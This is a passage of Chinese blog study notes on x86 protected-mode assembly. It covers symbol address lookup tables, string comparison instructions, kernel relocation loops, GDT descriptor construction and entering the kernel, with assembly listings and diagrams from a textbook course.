用户程序中的符号地址检索表</h2><p>本节使用<mark>c13_mbr0.asm</mark>作为引导程序：首先创建一些初始的段描述符、进入保护模式、加载内核、对内和进行设置和重定位、最后将控制权交给内核跳转执行内核程序。</p><p>内核发布时需要向程序员发布一个内核编程手册，对于我们这个<mark>c13_core1.asm</mark>内核也有一个编程手册：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/045ee1d4090c61889bf9cdc6eb188a8f.png" class=""><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/2b832ac9837b7415d63a77403641ae97.png" class=""><p>符号地址检索表位于用户程序头部，当内核加载用户程序时需要对这个表进行处理，会将每一个字符串的名字替换成其在内核中的地址，包括段选择子和段内偏移量。如此一来标号处存储的就是对应例程在内核中的地址。在用户程序头部定义符号地址检索表<mark>SALT(Symbol Address Lookup Table)</mark>。<br>如下：</p><pre><code class="assembly">SECTION header vstart=0         program_length   dd program_end          ;程序总长度#0x00                  head_len         dd header_end           ;程序头部的长度#0x04         stack_seg        dd 0                    ;用于接收堆栈段选择子#0x08         stack_len        dd 1                    ;程序建议的堆栈大小#0x0c                                                  ;以4KB为单位                                                           prgentry         dd start                ;程序入口#0x10          code_seg         dd section.code.start   ;代码段位置#0x14         code_len         dd code_end             ;代码段长度#0x18         data_seg         dd section.data.start   ;数据段位置#0x1c         data_len         dd data_end             ;数据段长度#0x20             ;-------------------------------------------------------------------------------         ;符号地址检索表         salt_items       dd (header_end-salt)/256 ;#0x24                  salt:                                     ;#0x28         PrintString      db  '@PrintString'                     times 256-($-PrintString) db 0                              TerminateProgram db  '@TerminateProgram'                     times 256-($-TerminateProgram) db 0                              ReadDiskData     db  '@ReadDiskData'                     times 256-($-ReadDiskData) db 0                 header_end:   </code></pre><h2 id="04-内核程序中的符号地址检索表"><a href="#04-内核程序中的符号地址检索表" class="headerlink" title="04. 内核程序中的符号地址检索表"></a>04. 内核程序中的符号地址检索表</h2><p>本节主要讲了内核中的符号地址检索表<mark>SALT</mark>的内容，在<mark>c13_core1.asm</mark>中的定义如下：</p><pre><code class="assembly">SECTION core_data vstart=0                  ;系统核心的数据段;-------------------------------------------------------------------------------         pgdt             dw  0             ;用于设置和修改GDT                           dd  0         ram_alloc        dd  0x00100000    ;下次分配内存时的起始地址         ;符号地址检索表         salt:         salt_1           db  '@PrintString'                     times 256-($-salt_1) db 0                          dd  put_string                          dw  sys_routine_seg_sel         salt_2           db  '@ReadDiskData'                     times 256-($-salt_2) db 0                          dd  read_hard_disk_0                          dw  sys_routine_seg_sel         salt_3           db  '@PrintDwordAsHexString'                     times 256-($-salt_3) db 0                          dd  put_hex_dword                          dw  sys_routine_seg_sel         salt_4           db  '@TerminateProgram'                     times 256-($-salt_4) db 0                          dd  return_point                          dw  core_code_seg_sel         salt_item_len   equ $-salt_4         salt_items      equ ($-salt)/salt_item_len</code></pre><h2 id="05-串比较指令CMPS"><a href="#05-串比较指令CMPS" class="headerlink" title="05. 串比较指令CMPS"></a>05. 串比较指令CMPS</h2><p>内核启动流程：</p><ul><li>从主引导程序进入内核</li><li>显示一些文本信息、显示处理器品牌信息</li><li>调用<mark>load_relocate_program</mark>加载和重定位用户程序</li><li>显示文本信息</li><li>调转执行用户程序</li></ul><p>其中<mark>load_relocate_program</mark>中添加了对符号地址检索表的处理：</p><ul><li>读硬盘扇区，将用户程序读入内存，为用户程序的每个段创建描述符；</li><li>处理符号地址检索表，即将符号出的字符串替换成其对应例程在内存中的地址，替换成例程在内存中的<mark>段选择子</mark>和<mark>段内偏移量</mark>。如何知道每个字符串所代表的例程在内存中的地址呢？<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/ad854eef0591d42fe1ccce5858a97c02.png" class="">将用户程序中的符号取出，依次和内核中的符号地址检索表中的内容进行比较，相同的话就是用内核中对应的后六个字节的<mark>段选择子</mark>和<mark>段内偏移量</mark>覆盖用户程序原先的符号，覆盖之后用户程序中存放的就是对应例程的<mark>段选择子</mark>和<mark>段内偏移量</mark>。</li><li>处理完<mark>SALT</mark>之后返回</li></ul><p>其中，使用字符串比较指令<mark>cmpsb、cmpsw、cmpsd、cmpsq</mark>进行字符串比较：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/cb32bf565275d98327fe23c223c2751c.png" class=""><h2 id="06-串比较的方向和重复前缀"><a href="#06-串比较的方向和重复前缀" class="headerlink" title="06. 串比较的方向和重复前缀"></a>06. 串比较的方向和重复前缀</h2><p><mark>CMPS</mark>指令只会执行一次，重复比较需要使用指令重复前缀<mark>rep</mark>。</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/f544652bb7f4ed2453d57b5826ea103d.png" class=""><p><mark>rep</mark>重复前缀：指令每执行一次，<mark>CX/ECX/RCX</mark>值减1。</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/13cb4f393d56a743c45f57fc45018557.png" class=""><p>如果总字节数除不尽的话，应该使用<mark>cmpsb</mark>，而不是<mark>cmpsw</mark>指令，<mark>CX、ECX、RCX</mark>设置的总字节数是字符串的长度，所以两个字符串长度要相等。</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/1b52744b5b7594ac73020c7bf1880bde.png" class=""><p>重复前缀<mark>rep</mark>指令不会在比较字符串时做出判断，这个问题使用如下方法解决：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/399ef3d5492da8102fdca97626a80bff.png" class=""><p>例如指令，<mark>repe cmpsw</mark>，执行过程是：以字节为单位进行字符串比较，若相等则设置零标志位<mark>ZF = 1</mark>，也将<mark>CX/ECX/RCX</mark>减1，若<mark>CX/ECX/RCX</mark>不为零且<mark>ZF = 1</mark>，表示字符串相等继续比较，若在<mark>C<br>X/ECX/RCX</mark>不为零但是<mark>ZF = 0</mark>则表示当前字符串不相等，比较终止。</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/840e693515f2ec110ffa54d2cf589fc1.png" class=""><p>字符串比较的完整过程：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/f92bc1d8d48b0065e1f85321f6fd7f01.png" class=""><h2 id="07-使用外循环依次取得用户SALT表中的每个条目"><a href="#07-使用外循环依次取得用户SALT表中的每个条目" class="headerlink" title="07. 使用外循环依次取得用户SALT表中的每个条目"></a>07. 使用外循环依次取得用户SALT表中的每个条目</h2><p>接05节：<br>在<mark>load_relocate_program</mark>中，添加了符号地址检索表<mark>SALT</mark>的重定位过程：</p><pre><code>SECTION core_code vstart=0;-------------------------------------------------------------------------------load_relocate_program:                      ;加载并重定位用户程序                                            ;输入：ESI=起始逻辑扇区号                                            ;返回：AX=指向用户程序头部的选择子                                                    ...        ...        ...                 ;重定位SALT         mov eax,[edi+0x04]         mov es,eax                         ;es -&gt; 用户程序头部          mov eax,core_data_seg_sel         mov ds,eax               cld         mov ecx,[es:0x24]                  ;用户程序的SALT条目数         mov edi,0x28                       ;用户程序内的SALT位于头部内0x2c处  .b2:          push ecx         push edi               mov ecx,salt_items         mov esi,salt  .b3:         push edi         push esi         push ecx         mov ecx,64                         ;检索表中，每条目的比较次数          repe cmpsd                         ;每次比较4字节          jnz .b4         mov eax,[esi]                      ;若匹配，esi恰好指向其后的地址数据         mov [es:edi-256],eax               ;将字符串改写成偏移地址          mov ax,[esi+4]         mov [es:edi-252],ax                ;以及段选择子   .b4:               pop ecx         pop esi         add esi,salt_item_len         pop edi                            ;从头比较          loop .b3               pop edi         add edi,256         pop ecx         loop .b2         mov ax,[es:0x04]         pop es                             ;恢复到调用此过程前的es段          pop ds                             ;恢复到调用此过程前的ds段               pop edi         pop esi         pop edx         pop ecx         pop ebx               ret</code></pre><p>其中：在用户程序中，偏移<mark>为4</mark>的地方之前是用户程序头部段的长度，现在被修改为用户程序头部段的选择子。</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/cffe3bc20c22bb6c0d0838d5f97f1b38.png" class=""><p>其中比较过程使用循环进行，外循环遍历用户程序、内存换遍历内核程序：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/d9f76df51c8017be3e97601d9ba12156.png" class=""><p>外循环：每执行一次都会使得<mark>EDI</mark>指向代表下一个例程名称字符串的首地址。</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/47b044824e22a668d5aeb2b50cd7b2bb.png" class=""><h2 id="08-使用内循环依次取得内核SALT表中的每个条目并进行比较"><a href="#08-使用内循环依次取得内核SALT表中的每个条目并进行比较" class="headerlink" title="08. 使用内循环依次取得内核SALT表中的每个条目并进行比较"></a>08. 使用内循环依次取得内核SALT表中的每个条目并进行比较</h2><p>在上一节中：<mark>EDI</mark>增量为256字节、<mark>ESI</mark>增量为262字节。</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/7a4cc3780aa0afd2380c9944eb6f623b.png" class=""><p>内循环：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/61f71545c621852f4eebde07416d2585.png" class=""><p>其中，字符串比较：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/08bc6810d695962b147e3dc0edc4b404.png" class=""><p>执行比较之前：</p><ul><li>现在段寄存器<mark>ES</mark>指向用户程序数据段；</li><li><mark>EDI</mark>指向用户程序符号地址检索表的某个条目；</li><li>段寄存器<mark>DS</mark>指向内核数据段；</li><li><mark>ESI</mark>指向内核符号地址检索表的某个条目；</li></ul><p>在检索表中，每个字符串的长度是<mark>256个字节 = 64个双字</mark>；<br>如果两个字符串相同，比较操作要进行64次，结束后零标志位ZF = 1;<br>如果两个字符串不同，比较操作中止，此时零标志位ZF = 0。</p><p>如果比较结束之后<mark>ZF = 1</mark>，表示字符串相同，执行重定位操作：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/eebc49647b46d4e2b4c9efb4c3d2dbab.png" class=""><p>具体过程看下面代码：</p><pre><code class="assembly">         mov ecx,64                         ;检索表中，每条目的比较次数          repe cmpsd                         ;每次比较4字节          jnz .b4         mov eax,[esi]                      ;若匹配，esi恰好指向其后的地址数据         mov [es:edi-256],eax               ;将字符串改写成偏移地址          mov ax,[esi+4]         mov [es:edi-252],ax                ;以及段选择子 </code></pre><h2 id="09-用户程序中使用内核编程接口读硬盘和显示文本"><a href="#09-用户程序中使用内核编程接口读硬盘和显示文本" class="headerlink" title="09. 用户程序中使用内核编程接口读硬盘和显示文本"></a>09. 用户程序中使用内核编程接口读硬盘和显示文本</h2><p>其中在内核跳转执行用户程序时，使用<mark>jmp far [0x08]</mark>指令，不需要在栈中压入返回地址；之前使用<mark>call</mark>指令需要在栈中压入返回地址，所以有栈的切换问题。</p><p>进入用户程序执行，使用内核例程。</p><pre><code class="assembly">SECTION code vstart=0start:    mov eax,ds    mov fs,eax        mov ss,[fs:stack_seg]      ;ss指向用户程序自己的栈段    mov esp,stack_end        mov ds,[fs:data_seg];ds指向用户程序自己的数据段        mov ebx,message_1         ;ebx指向偏移地址    call far [fs:PrintString];调用内核put_string例程        mov eax,100                 ;逻辑扇区号100    mov ebx,buffer              ;缓冲区偏移地址    call far [fs:ReadDiskData]  ;段间调用        mov ebx,message_2    call far [fs:PrintString]        mov ebx,buffer    call far [fs:PrintString]           ;too.        jmp far [fs:TerminateProgram]       ;将控制权返回到系统code_end:</code></pre><h2 id="10-虚拟机验证程序执行"><a href="#10-虚拟机验证程序执行" class="headerlink" title="10. 虚拟机验证程序执行"></a>10. 虚拟机验证程序执行</h2><p>先用Vhd Writer讲文件写入要读取的<mark>100号扇区</mark><br>再使用<mark>VirtualBox</mark>虚拟机测试代码</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/acbb223d65c87a95abe0c1c6a57a075a.png" class=""><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/68b455214947bd9ce839cd7b7c199545.png" class=""><h2 id="11-以16进制形式显示一个双字以及PUSHAD、POPAD和XLAT指令的使用"><a href="#11-以16进制形式显示一个双字以及PUSHAD、POPAD和XLAT指令的使用" class="headerlink" title="11. 以16进制形式显示一个双字以及PUSHAD、POPAD和XLAT指令的使用"></a>11. 以16进制形式显示一个双字以及PUSHAD、POPAD和XLAT指令的使用</h2><p>在内核中实现了<mark>put_hex_dword</mark>例程：</p><pre><code class="assembly">    ;汇编语言程序是极难一次成功，而且调试非常困难。这个例程可以提供帮助put_hex_dword:;在当前光标处以十六进制形式显示                                ;一个双字并推进光标                                ;输入：EDX=要转换并显示的数字                                ;输出：无    pushad    push ds        mov ax,core_data_seg_sel    ;切换到核心数据段    mov ds,ax        mov ebx,bin_hex             ;指向核心数据段内的转换表    mov ecx,8.xlt:    rol edx,4    mov eax,edx    and eax,0x0000000f    xlat        push ecx    mov cl,al    call put_char    pop ecx        loop .xlt        pop ds    popad        retf</code></pre><p>使用上述例程显示一个双字的16进制形式。</p><p>在内核数据段中定义了一个字符串：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/5f0099e490a46b3416c67f91f594fa5c.png" class=""><p>每个字符在字符串中的偏移正好可以代表其作为16进制的数字字符。</p><p>将32位二进制数分成8个4位，将每个4位二进制数据转化为16进制，再用值作为偏移去取出对应的字符显示出来即可。</p><p>其中<mark>pushad</mark>：每次先将<mark>ESP减4</mark>，<mark>ESP</mark>是先保存再压入。</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/ac6aa3c66215e25c2f6d1090953ec547.png" class=""><p>对应的<mark>popad</mark>指令：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/4c3b9f98064b65ba4890b24688071a4b.png" class=""><p>其中<mark>xalt</mark>指令：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/80dc47c15fb9439664aebc9dff90824c.png" class=""><p>运行过程：将<mark>EDX</mark>循环左移4位，再备份到<mark>EAX</mark>中，<mark>EAX</mark>除了低四位外全部置零，就可以获取<mark>AL</mark>的值了。</p><p>课后作业：<br>使用<mark>put_hex_dword</mark>在屏幕上输出一串数字：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/7975a37ae207e8ef8dba0ae97b1d2ca9.png" class=""><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/image-20221113171015954.png" class="" title="image-20221113171015954">]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>25. 保护模式程序的动态加载和执行</title>
      <link href="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="01-本章的目标和内容提要"><a href="#01-本章的目标和内容提要" class="headerlink" title="01. 本章的目标和内容提要"></a>01. 本章的目标和内容提要</h2><p>引入保护模式、描述符、描述符表等并没有对用户程序的编写增加什么负担</p><ul><li>因为对于系统来说这些是必须的，对于运行在系统上的程序来说不需要关心这些</li></ul><span id="more"></span><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/9bb28704b96ba84ebdd5cd6715a3c693.png" class=""><h2 id="02-内核的结构和加载前的准备工作"><a href="#02-内核的结构和加载前的准备工作" class="headerlink" title="02. 内核的结构和加载前的准备工作"></a>02. 内核的结构和加载前的准备工作</h2><p>内核的加载包含<mark>c13_mbr.asm</mark>全部和<mark>c13_core. asm</mark>一小部分<br><strong>c13_mbr.asm</strong>用于：</p><ul><li>从BIOS中接管处理器以及硬件的控制权</li><li>安装最基本的段描述符</li><li>初始化最初的执行环境</li><li>然后从硬盘上读取和加载内核的剩余部分</li><li>创建组成内核的每一个内存段</li></ul><p><strong>c13_core.asm</strong>中定义的内核的分段信息：</p><ul><li>第一个分段：内核的头部，用于记录内核总长度，每个段的相对位置、以及入口点信息，以上统计信息用于告诉初始化代码如何加载内核；</li><li>第二个分段：公共例程段，本质上是一个代码段，包括一些可以反复使用的子过程，比如显示字符串例程、硬盘读写例程、内存分配例程、描述符创建和安装例程。这些子过程可以为内核自己使用也可以提供给用户程序使用；</li><li>第三个分段：数据段，包括系统核心数据，供内核自己使用；</li><li>第四个分段：代码段，包含进入内核之后首先要执行的代码、以及用于内存分配、读取和加载用户程序、控制用户程序的代码。</li></ul><h2 id="03-准备为内核的每个段创建和安装描述符"><a href="#03-准备为内核的每个段创建和安装描述符" class="headerlink" title="03. 准备为内核的每个段创建和安装描述符"></a>03. 准备为内核的每个段创建和安装描述符</h2><p>上一节中已经将内核全部读入内存， 这一节是找到内核的每一个段为他们创建并安装描述符。在保护模式下，内核访问自己的段也需要通过描述符。</p><p>内核的段描述符安装在<mark>GDT</mark>中，之前已经使用<mark>lgdt</mark>指令加载了<mark>GDTR</mark>，在这里我们就需要为<mark>GDT</mark>安装新的描述符。那我们的任务就是从标号<mark>pgdt</mark>处取得<mark>GDT</mark>的基地址，为其添加新的描述符，并修改新的界限值，之后使用<mark>lgdt</mark>指令再次加载<mark>GDTR</mark>使其生效。</p><p>但是，现在程序处于保护模式，对代码段的保护导致不能通过<mark>代码段描述符</mark>来修改代码段中的内容。但是可以使用占全部4G空间的数据段描述符（或者创建代码段的别名描述符）来修改与代码段重叠部分的内容。</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/1fa11bf5789cca5df597cba02705eafa.png" class=""><p>如图所示：大括号是4G字节的数据段、小括号是现在主引导程序所在的代码段，两个段有重叠的部分。</p><p>问：内核代码段的描述符还没有创建和安装，如何知道器选择子是什么？<br>答：内核常驻内存地址不会改变，内核在加载自己时会提前规划好每个段描述符的没醒，以及他们在描述符表中的位置，这样一来就知道每个段选择子的具体数值，因此为了方便可以将每个段的选择子定义为常数。<br>此时的内存布局：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/bb79369a945668586c907eff40be4df8.png" class=""><h2 id="04-段描述符的创建和BSWAP指令"><a href="#04-段描述符的创建和BSWAP指令" class="headerlink" title="04. 段描述符的创建和BSWAP指令"></a>04. 段描述符的创建和BSWAP指令</h2><p>本节使用到的代码片段：<br><mark>c13_mbr.asm</mark></p><pre><code>setup:         mov esi,[0x7c00+pgdt+0x02]         ;不可以在代码段内寻址pgdt，但可以                                            ;通过4GB的段来访问         ;建立公用例程段描述符         mov eax,[edi+0x04]                 ;公用例程代码段起始汇编地址         mov ebx,[edi+0x08]                 ;核心数据段汇编地址         sub ebx,eax         dec ebx                            ;公用例程段界限          add eax,edi                        ;公用例程段基地址         mov ecx,0x00409800                 ;字节粒度的代码段描述符         call make_gdt_descriptor         mov [esi+0x28],eax         mov [esi+0x2c],edx </code></pre><p><mark>c13_core.asm</mark></p><pre><code>make_seg_descriptor:                        ;构造存储器和系统的段描述符                                            ;输入：EAX=线性基地址                                            ;      EBX=段界限                                            ;      ECX=属性。各属性位都在原始                                            ;          位置，无关的位清零                                             ;返回：EDX:EAX=描述符         mov edx,eax         shl eax,16         or ax,bx                           ;描述符前32位(EAX)构造完毕         and edx,0xffff0000                 ;清除基地址中无关的位         rol edx,8         bswap edx                          ;装配基址的31~24和23~16  (80486+)         xor bx,bx         or edx,ebx                         ;装配段界限的高4位         or edx,ecx                         ;装配属性         retf </code></pre><p>内存布局如下，使用的是4G字节的数据段从0开始，那么公共例程段的逻辑地址就等于<mark>EDI</mark>指定的地址。</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/b0486969de5d713ba29775fe980d06fd.png" class=""><p>使用<mark>make_gdt_descriptor</mark>子程序构造描述符的低32位：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/72752de04c5902657684c80fe03e60d4.png" class=""><p>高32位的基地址部分：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/53951340edc787f76dad35ab5b8028c6.png" class=""><p>数据反转指令：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/8e19731756b24be358680fb326a7e15d.png" class=""><p>将32位寄存器分成四个八位头尾反转，中间相邻反转：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/07bfd474ab406622ec6744724c74846d.png" class=""><p>高32位的<mark>段界限</mark>部分：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/ca7c9e31c5f3d321a4ea2243ef708dac.png" class=""><h2 id="05-进入内核执行"><a href="#05-进入内核执行" class="headerlink" title="05. 进入内核执行"></a>05. 进入内核执行</h2><p>本节用到的代码片段：</p><pre><code>         ;建立核心数据段描述符         mov eax,[edi+0x08]                 ;核心数据段起始汇编地址         mov ebx,[edi+0x0c]                 ;核心代码段汇编地址          sub ebx,eax         dec ebx                            ;核心数据段界限         add eax,edi                        ;核心数据段基地址         mov ecx,0x00409200                 ;字节粒度的数据段描述符          call make_gdt_descriptor         mov [esi+0x30],eax         mov [esi+0x34],edx                ;建立核心代码段描述符         mov eax,[edi+0x0c]                 ;核心代码段起始汇编地址         mov ebx,[edi+0x00]                 ;程序总长度         sub ebx,eax         dec ebx                            ;核心代码段界限         add eax,edi                        ;核心代码段基地址         mov ecx,0x00409800                 ;字节粒度的代码段描述符         call make_gdt_descriptor         mov [esi+0x38],eax         mov [esi+0x3c],edx         mov word [0x7c00+pgdt],63          ;描述符表的界限                                                 lgdt [0x7c00+pgdt]                           jmp far [edi+0x10]</code></pre><p>内核加载之后的<mark>GDT</mark>布局：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/24a4d1969cb1dce52429158938f30178.png" class=""><p>4G字节字段内存布局：</p><img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/06ac92012b3feaf193f6590e8e96669e.png" class=""><p>执行<mark>jmp far[edi+0x10]</mark> 指令时：处理器使用 <mark>DS描述符高速缓存器中的基地址0</mark> 加上 <mark>[edi+0x10]生成的有效偏移地址</mark> 得到内存中的线性地址去访问内存取出<font color="#00ffff" size="3">32位段内偏移</font>和 <mark>16位段选择子</mark>，然后用<mark>段选择子</mark>到<mark>GDT</mark>中取出对应的<mark>段描述符</mark>在经过检查后放入<mark>CS描述符高速缓存器</mark>中，同时将<font color="#00ffff" size="3">32位段内偏移</font>传送到<font color="#00ffff" size="3">EIP</font>，之后处理器使用<mark>CS描述符高速缓存器</mark>中的<mark>段基地址</mark>加上<font color="#00ffff" size="3">EIP</font>中的偏移作为逻辑地址去执行指令，即到内核入口点取指令并执行。</p><h2 id="06-进入内核之后显示文本"><a href="#06-进入内核之后显示文本" class="headerlink" title="06. 进入内核之后显示文本"></a>06. 进入内核之后显示文本</h2><p>进入内核之后显示文本信息，本节代码：</p><pre><code>SECTION sys_routine vstart=0                ;系统公共例程代码段 ;-------------------------------------------------------------------------------         ;字符串显示例程put_string:                                 ;显示0终止的字符串并移动光标                                             ;输入：DS:EBX=串地址         push ecx  .getc:         mov cl,[ebx]         or cl,cl         jz .exit         call put_char         inc 